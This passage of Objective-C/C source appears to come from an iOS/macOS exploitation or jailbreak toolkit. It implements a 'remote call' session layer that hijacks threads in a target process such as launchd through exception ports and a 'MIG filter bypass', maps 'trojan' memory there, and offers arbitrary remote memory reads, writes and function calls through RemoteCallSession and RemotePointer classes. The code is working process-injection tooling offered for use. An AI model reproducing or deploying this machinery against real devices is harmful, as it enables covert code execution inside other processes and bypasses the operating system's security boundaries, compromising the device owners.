               ? " — PID MISMATCH/timeout, protocol suspect (cross-traffic?)"
               : "");

    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);

    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);

    // Round 20 (C-ii): NEVER mint a "successful" session on a poisoned
    // protocol. The unconditional g_RC_success = true that used to stand here
    // turned the 071602 double-hijack's starved pre-warm into a "Finished
    // successfully" session with pid=0 (every temp/stable call had timed out
    // on traps stolen by the other init): a zombie session whose teardown
    // could not restore its trojan and whose ports outlived its usefulness.
    // Any anomaly — a failed call (g_RC_success=false), a wrong/zero pid, or
    // no trojan memory — fails the init; the symmetric teardown (restore +
    // drain + un-arm audit) runs via destroy_remote_call_internal, exactly
    // like the round-19 restore-failure path above.
    if (!g_RC_success || g_RC_pid <= 0 || g_RC_pid != (int)targetPid ||
        !g_RC_trojanMem) {
        printf("[RC] init: POST-INIT VALIDATION FAILED (success=%d pid=%d "
               "target=%d trojanMem=%#llx) — protocol poisoned by cross-session "
               "traffic; tearing down with invariant repair and failing the "
               "init instead of keeping a zombie session warm\n",
               g_RC_success ? 1 : 0, g_RC_pid, (int)targetPid,
               (unsigned long long)g_RC_trojanMem);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        destroy_remote_call_internal();
        return -1;
    }
    RC_DEBUG("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);

    rc_start_firstport_responder(firstExceptionPort);
    return 0;
}

int init_remote_call_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    int previousTimeout = state->firstExceptionTimeoutMS;
    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : previousTimeout;
    int result = init_remote_call(process, useMigFilterBypass);
    state->firstExceptionTimeoutMS = previousTimeout;
    return result;
}

int init_remote_call_original_thread_only_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    bool previousOriginalThreadOnly = state->originalThreadOnly;
    state->originalThreadOnly = true;
    int result = init_remote_call_with_first_exception_timeout(process, useMigFilterBypass, firstExceptionTimeoutMS);
    state->originalThreadOnly = previousOriginalThreadOnly;
    return result;
}

@implementation RemoteCallSession {
    RemoteCallState _state;
}

- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:120000];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:firstExceptionTimeoutMS
              originalThreadOnly:NO];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
              originalThreadOnly:(BOOL)originalThreadOnly
{
    self = [super init];
    if (!self)
        return nil;

    memset(&_state, 0, sizeof(_state));
    _state.success = true;
    _state.threadList = [NSMutableArray new];
    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : 120000;
    _state.stableExceptionTimeoutFloorMS = 10000;
    _state.originalThreadOnly = originalThreadOnly;

    const char *processName = process.UTF8String;
    if (!processName)
        return nil;

    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = init_remote_call(processName, useMigFilterBypass);
    if (result != 0) {
        abandon_remote_call();
    }
    remote_call_pop_state(previous);

    if (result != 0)
        return nil;

    return self;
}

- (void)dealloc
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    if (remote_call_has_local_state()) {
        destroy_remote_call();
    }
    remote_call_pop_state(previous);
}

- (uint64_t)taskAddr
{
    return _state.taskAddr;
}

- (uint64_t)trojanMem
{
    return _state.trojanMem;
}

- (int)pid
{
    return _state.pid;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                          functionAddress:(uint64_t)pcAddr
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable_addr(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_read(src, dst, size);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)remoteRead64:(uint64_t)src
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = remote_read64(src);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite:(uint64_t)dst from:(const void *)src size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write(dst, src, size);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite64:(uint64_t)dst value:(uint64_t)val
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write64(dst, val);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWriteString:(uint64_t)dst value:(const char *)str
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_writeStr(dst, str);
    remote_call_pop_state(previous);
    return result;
}

- (int)destroyRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = destroy_remote_call();
    remote_call_pop_state(previous);
    return result;
}

- (void)abandonRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    abandon_remote_call();
    remote_call_pop_state(previous);
}

- (BOOL)hasLocalState
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_call_has_local_state();
    remote_call_pop_state(previous);
    return result;
}

// Round 20: YES when this session's first-port responder saw a protocol PARK
// TRAP (or a crash) and exited — the session then has no responder and a
// launchd thread parked on its first port. Such a session must be torn down
// with invariant repair, never reused or kept warm (071602 watchdog panic).
- (BOOL)isAnomalous
{
    return rc_anomalous_port_check(_state.firstExceptionPort);
}

- (RemoteCallState *)remoteCallStatePointer
{
    return &_state;
}

- (RemotePointer *)objectAtIndexedSubscript:(NSUInteger)address
{
    return [[RemotePointer alloc] initWithSession:self address:address];
}

@end

#define REMOTE_POINTER_DEFAULT_STRING_MAX 0x4000
#define REMOTE_POINTER_STRING_CHUNK 0x100

@implementation RemotePointer

- (instancetype)initWithSession:(RemoteCallSession *)session address:(uint64_t)address
{
    self = [super init];
    if (!self)
        return nil;

    _session = session;
    _address = address;
    return self;
}

- (BOOL)readTo:(void *)dst size:(uint64_t)size
{
    return [_session remoteRead:_address to:dst size:size];
}

- (BOOL)writeFrom:(const void *)src size:(uint64_t)size
{
    return [_session remoteWrite:_address from:src size:size];
}

- (BOOL)writeCString:(const char *)string
{
    return [_session remoteWriteString:_address value:string];
}

- (void)setString:(NSString *)string
{
    [self writeCString:string.UTF8String];
}

- (NSString *)string
{
    return [self stringWithMaxLength:REMOTE_POINTER_DEFAULT_STRING_MAX];
}

- (NSString *)stringWithMaxLength:(size_t)maxLength
{
    if (!_session || !_address || maxLength == 0)
        return nil;

    char *buf = (char *)calloc(maxLength + 1, 1);
    if (!buf)
        return nil;

    size_t copied = 0;
    while (copied < maxLength) {
        size_t chunk = REMOTE_POINTER_STRING_CHUNK;
        if (chunk > maxLength - copied)
            chunk = maxLength - copied;

        uint64_t current = _address + copied;
        size_t pageRemaining = (size_t)(PAGE_SIZE - (current & PAGE_MASK));
        if (chunk > pageRemaining)
            chunk = pageRemaining;

        if (![_session remoteRead:_address + copied to:buf + copied size:chunk]) {
            free(buf);
            return nil;
        }

        char *end = memchr(buf + copied, 0, chunk);
        if (end) {
            size_t length = (size_t)(end - buf);
            NSString *result = [[NSString alloc] initWithBytes:buf length:length encoding:NSUTF8StringEncoding];
            free(buf);
            return result;
        }

        copied += chunk;
    }

    NSString *result = [[NSString alloc] initWithBytes:buf length:maxLength encoding:NSUTF8StringEncoding];
    free(buf);
    return result;
}

- (void)setValue8:(uint8_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint8_t)value8
{
    uint8_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue16:(uint16_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint16_t)value16
{
    uint16_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue32:(uint32_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint32_t)value32
{
    uint32_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue64:(uint64_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint64_t)value64
{
    uint64_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

@end

void remote_call_with_session(RemoteCallSession *session, void (^block)(void))
{
    if (!block)
        return;

    if (!session) {
        block();
        return;
    }

    RemoteCallState *state = [session remoteCallStatePointer];
    RemoteCallState *previous = remote_call_push_state(state);
    @try {
        block();
    } @finally {
        remote_call_pop_state(previous);
    }
}
